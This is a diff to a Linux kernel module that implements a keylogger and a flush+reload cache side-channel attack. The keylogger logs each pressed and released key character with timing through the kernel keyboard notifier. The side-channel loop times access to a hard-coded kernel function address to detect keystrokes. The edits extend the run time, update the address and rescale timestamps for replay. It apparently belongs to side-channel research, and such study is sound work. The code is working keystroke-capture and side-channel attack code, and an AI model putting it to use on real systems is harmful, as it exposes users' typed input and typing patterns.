@@ -13,15 +13,18 @@ static int threshold = 155;
 static u64 last_press = 0;
 
 // execution time of the flush+reload thread in seconds
-#define EXEC_TIME 10
+#define EXEC_TIME 200
 
 #define LINE_SIZE 64
 
+#define CPU_CLOCK 34
+//we leave it at 34 and don't do any extra calulcation as we replay the results at 10x speed 
+
+#define REPLAY_SPD 1
+
+#define FUNCTION_ADDRESS 0xffffffffa4506b20
 
 
-#define CPU_CLOCK 340000000000000000    //TODO: Change to your CPU, Current: I7-2600
-
-#define FUNCTION_ADDRESS 0xffffffffa3f06b20
 
 u64 fenced_rdtsc(void) {
   u64 a, d;
@@ -61,14 +64,14 @@ static int keylogger_notify(struct notifier_block *nb, unsigned long action,
   if (action == KBD_KEYSYM) { // Check if a key is pressed
     u64 t1 = fenced_rdtsc();
     if (param->down) {
-      printk(KERN_INFO "{\'type\': \'press\', \'key-char\': \'%c\', "
+      printk(KERN_INFO "{\"type\": \"press\", \"key-char\": \"%c\", "
                        "\'keystroke-time\': %llu}",
-             param->value - 64353 + 'a', t1 - start_time);
+             param->value - 64353 + 'a', ((t1 - start_time)/CPU_CLOCK)*10*REPLAY_SPD);
       last_press = t1;
     } else {
-      printk(KERN_INFO "{\'type\': \'release\', \'key-char\': \'%c\', "
+      printk(KERN_INFO "{\'type\': \'release\', \'key-char\': \"%c\", "
                        "\'keystroke-time\': %llu, \'keyhold\': %llu}",
-             param->value - 64353 + 'a', t1 - start_time, t1 - last_press);
+             param->value - 64353 + 'a', ((t1 - start_time)/CPU_CLOCK)*10*REPLAY_SPD, ((t1 - last_press)/CPU_CLOCK)*10*REPLAY_SPD);
     }
   }
 
@@ -76,17 +79,17 @@ static int keylogger_notify(struct notifier_block *nb, unsigned long action,
 }
 
 static int keystroke_timing(void *data) {
-  u64 thread_start = ktime_get_seconds(); 
+  u64 thread_start = ktime_get_seconds();
   u64 current_time = thread_start;
-  u64 last_hit_time = (fenced_rdtsc() / CPU_CLOCK); //TODO:ktime_get_real_ns
+  u64 last_hit_time = fenced_rdtsc();
   while (current_time - thread_start < EXEC_TIME) {
     u64 time = flush_reload_t((void *)(FUNCTION_ADDRESS));
     if (time < threshold) {
-      u64 current_time_ns = (fenced_rdtsc() / CPU_CLOCK);
+      u64 current_time_ns = fenced_rdtsc();
       printk(KERN_INFO "{\'last-hit\': %llu, \'keystroke-time\': %llu}",
-             current_time_ns - last_hit_time - time,
-             current_time_ns - start_time -
-                 time); // subtract flush+reload time to make it a little more
+             ((current_time_ns - last_hit_time - time) / CPU_CLOCK)*10*REPLAY_SPD ,
+             ((current_time_ns - start_time -
+                 time) / CPU_CLOCK)*10*REPLAY_SPD); // subtract flush+reload time to make it a little more
                         // accurate
       last_hit_time = current_time_ns - time;
     }
